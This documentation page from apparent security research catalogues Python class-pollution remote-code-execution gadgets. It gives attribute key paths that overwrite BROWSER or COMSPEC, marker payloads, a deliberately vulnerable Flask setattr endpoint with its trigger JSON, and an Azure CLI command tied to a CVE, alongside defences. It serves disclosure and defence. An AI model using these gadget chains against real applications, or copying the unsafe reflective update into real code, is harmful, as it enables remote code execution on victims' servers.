---
title: "RCE Gadgets"
weight: 1
---

# RCE Gadgets

A class-pollution RCE gadget is a (key path, value) pair that, when applied through a
reflective sink, causes the victim process to execute attacker-chosen code. Unlike
classical deserialization RCE, no pickle or eval is required: the attacker only writes a
single attribute whose value the victim's own code later passes to a subprocess, an
import hook, or a shell.

{{< hint danger >}}
Each gadget below has been confirmed end-to-end against a real package. See the linked
showcase pages for PoC code. RCE was landed in
[django-unicorn]({{< relref "/docs/collection/showcases/django-unicorn" >}}),
[Mesop]({{< relref "/docs/collection/showcases/mesop" >}}),
[Taipy]({{< relref "/docs/collection/showcases/taipy" >}}), and
[Azure&nbsp;CLI]({{< relref "/docs/collection/showcases/azure-cli" >}}).
{{< /hint >}}

## Gadget 1 &mdash; `os.environ.BROWSER` + `antigravity`

### Mechanism

The `webbrowser` stdlib module, when `webbrowser.open()` is called, consults the
`BROWSER` environment variable and invokes the corresponding string as a shell command
through `subprocess` on POSIX (via `Popen(..., shell=False)` after splitting on
whitespace, but a command path like `/bin/sh -c 'cmd'` still resolves to shell
execution). Importing `antigravity` calls `webbrowser.open()` with a fixed URL. Therefore
overwriting `os.environ["BROWSER"]` and then triggering an `antigravity` import yields
arbitrary shell execution.

### Key path and payload

```
__class__.__init__.__globals__.sys.modules.os.environ.BROWSER
```

```python
value = "/bin/sh -c 'touch /tmp/pwned'"
```

### Preconditions

- `os` must be imported (it almost always is &mdash; `os` is imported by the Python
  startup sequence itself).
- The victim must later import `antigravity`, or the attacker must cause that import.
  `antigravity` is a small stdlib module not imported by default.
- POSIX; on Windows use the `COMSPEC` variant in Gadget&nbsp;4.

### Triggering the import

If the victim application performs deferred imports based on a cache or TODO list,
poisoning that cache is sufficient. django-unicorn has a `location_cache` whose
`_Cache__data.todo` list is processed at a later request; an entry of `["antigravity",
"any"]` causes the process to `import antigravity`, which calls `webbrowser.open()`,
which reads `BROWSER`.

```
# 1st write: stage the payload
name:  __init__.__globals__.sys.modules.os.environ.BROWSER
value: "/bin/sh -c 'touch /tmp/pwned'"

# 2nd write: poison a module-import queue that the app later drains
name:  __init__.__globals__.location_cache._Cache__data.todo
value: ["antigravity", "any"]
```

When the application next drains the todo list, `import antigravity` fires the gadget.

### Worked example &mdash; minimal Flask

```python
from flask import Flask, request

app = Flask(__name__)

class State: pass
state = State()

def update(obj, data):
    for k, v in data.items():
        if isinstance(v, dict):
            update(getattr(obj, k), v)
        else:
            setattr(obj, k, v)

@app.post("/update")
def post_update():
    update(state, request.get_json())
    return ""

# Trigger:
# POST /update  {"__class__":{"__init__":{"__globals__":{"sys":{"modules":
#   {"os":{"environ":{"BROWSER":"/bin/sh -c 'touch /tmp/pwned'"}}}}}}}}
# Then: in a later request, cause `import antigravity` to run.
```

### Variants

- **`COMSPEC` on Windows** (Gadget&nbsp;4): Azure CLI's reproducer uses `COMSPEC` because
  the affected CLI spawns subprocesses through `cmd.exe` on Windows.
- **`LD_PRELOAD` / `PYTHONSTARTUP`**: where the victim later spawns a Python child, these
  environment variables are also attractive but typically require a fork.

## Gadget 2 &mdash; `sys.modules` cache injection

### Mechanism

`sys.modules` is the cache that `import` consults first. Writing an attacker-controlled
object to `sys.modules["target"]` means a later `import target` binds to that object
without executing any loader. If any module reachable by a name is dynamically imported
by the victim, the cache is a direct code-injection sink.

### Key path

```
__class__.__init__.__globals__.sys.modules.<module_name>
```

### Preconditions

- The victim performs a dynamic import of `<module_name>` *after* the pollution.
- `<module_name>` must be one the victim reaches (templating, plugin systems, and ORM
  backends are common candidates &mdash; e.g. `django.template.loaders.cached`,
  `importlib.import_module(user_provided_name)`).

### Defense

- Do not accept user-derived module names into `importlib.import_module`.
- Treat `sys.modules` as sensitive at the sink: reject any key path that descends through
  `sys.modules` at the reflective setter.

## Gadget 3 &mdash; `subprocess` default-arguments pollution

### Mechanism

When the application later calls `subprocess.run` / `subprocess.Popen`, the default
values of its keyword parameters are taken from `subprocess` module globals. Overwriting
`subprocess._USE_POSIX_SPAWN` or replacing the reference `subprocess._args_from_interpreter_flags`
can alter how subsequent spawn calls interpret their arguments, which in combination with
an attacker-controlled command argument yields RCE.

This gadget is narrower than Gadget&nbsp;1: it requires *both* pollution of a subprocess
internal *and* attacker influence over the command string. In practice it is useful as a
second stage when `os.environ` writes are blocked.

## Gadget 4 &mdash; OS command injection via Azure CLI (`COMSPEC`)

### Real-world instance

[Azure CLI, CVE-2025-24049]({{< relref "/docs/collection/showcases/azure-cli" >}}).

The `az resource update --set` flag resolves a dotted path through `set_properties`:

```
az resource update --ids "<id>" \
  --set "__class__.__init__.__globals__.sys.modules.os.environ.COMSPEC=cmd /c calc *"
```

### Key path and payload

```
__class__.__init__.__globals__.sys.modules.os.environ.COMSPEC
```

```python
value = "cmd /c calc *"
```

### Mechanism

On Windows, CPython's `subprocess` module reads `COMSPEC` (via `os.environ`) to decide
which shell to spawn when `shell=True`. Azure CLI issues subprocess calls during resource
update. Setting `COMSPEC` to an attacker-controlled command line causes the next
`subprocess.run(..., shell=True)` to execute it.

### Preconditions

- Windows victim. On Linux the equivalent is `SHELL`/`BROWSER` (Gadget&nbsp;1).
- The victim executes a `subprocess` call with `shell=True` after the pollution.

## General pattern for RCE gadgets

1. Reach a function via `__class__.__init__` or another `__class__.<method>` chain &mdash;
   this gets you to the class object and from there to any bound method.
2. Step through `__globals__` to reach the module namespace of that function.
3. Navigate `sys.modules` to the module you want (`os`, `subprocess`, `webbrowser`,
   `importlib`).
4. Overwrite an environment variable, a module global, or a cache that the victim
   consults later.
5. Trigger the consuming code path through normal application flow.

## Defense

- **Reject dunder-prefixed keys at the reflective sink.** See
  [Defense]({{< relref "/docs/defense" >}}) for the full mitigation list. Blocking only
  `__class__` is insufficient &mdash; any path beginning with `__init__` (which exists on
  every function) or `__globals__` (on every function) reaches the module namespace.
- **Do not perform `setattr` with user-provided keys** on objects whose class pollutes
  globally. Prefer typed data containers (`pydantic`, `attrs`, `dataclass`) that do not
  expose arbitrary `setattr`.
- **At the system level**, run web applications under a non-interactive environment
  that lacks `BROWSER`/`COMSPEC` &mdash; this raises the bar but does not eliminate the
  class of attack.

## Real-world cases

- [django-unicorn]({{< relref "/docs/collection/showcases/django-unicorn" >}}) &mdash;
  Gadget&nbsp;1 via WebSocket input.
- [Azure CLI]({{< relref "/docs/collection/showcases/azure-cli" >}}) &mdash; Gadget&nbsp;4
  via `--set`.
- [Taipy]({{< relref "/docs/collection/showcases/taipy" >}}) &mdash; Gadget&nbsp;1 via
  HTTP.
- [Mesop]({{< relref "/docs/collection/showcases/mesop" >}}) &mdash; remote execution
  path via dataclass reflective update.

## References

1. CPython source: `Lib/webbrowser.py` &mdash; `get()` consults `$BROWSER`.
   <https://github.com/python/cpython/blob/main/Lib/webbrowser.py>
2. CPython source: `Lib/antigravity.py` &mdash; `webbrowser.open(...)` on import.
   <https://github.com/python/cpython/blob/main/Lib/antigravity.py>
3. Microsoft Security Response Center. *CVE-2025-24049: Azure CLI Elevation of Privilege*.
   <https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2025-24049>
4. `django-unicorn` GHSA-g9wf-5777-gq43.
   <https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43>
